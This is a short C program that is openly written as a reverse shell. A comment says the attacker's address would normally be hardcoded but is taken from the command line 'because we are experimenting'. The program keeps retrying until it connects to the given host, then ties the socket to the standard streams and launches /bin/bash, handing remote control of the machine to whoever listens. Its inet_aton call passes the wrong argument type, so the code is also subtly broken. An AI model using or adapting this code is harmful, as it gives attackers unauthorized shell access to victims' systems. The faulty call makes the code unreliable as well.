#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include<sys/socket.h>
#include<netinet/in.h>

/*
	#define IPADDR "127.0.0.1"
	#define PORT 5004
 * 
 * The IP Address of the attacker / the VPN used by attacker should be hardcoded. Even the port.
 * But , because we are experimenting , we are taking them in as command line arguments.
 */
void err_exit(const char *errmsg) {
	fprintf(stderr , "%s\n" , errmsg);
	exit(1);
}

int main(int argc , char **argv) {

	int connect_sockfd;
	if((connect_sockfd = socket(PF_INET , SOCK_STREAM , IPPROTO_TCP)) == -1)
		err_exit("Error in socket()");

	struct sockaddr_in serveraddr;
	memset(&serveraddr , '\0' , sizeof(serveraddr));

	serveraddr.sin_family = PF_INET;
	serveraddr.sin_port = htons(atoi(argv[2]));
	inet_aton(argv[1] , serveraddr.sin_addr);

	while(1) {

		if(connect(connect_sockfd , (struct sockaddr *)&serveraddr , sizeof(serveraddr)) == 0)
			break;
		
	}

	dup2(connect_sockfd , 0);
	dup2(connect_sockfd , 1);
	dup2(connect_sockfd , 2);

	system("/bin/bash");

	return 0;
}






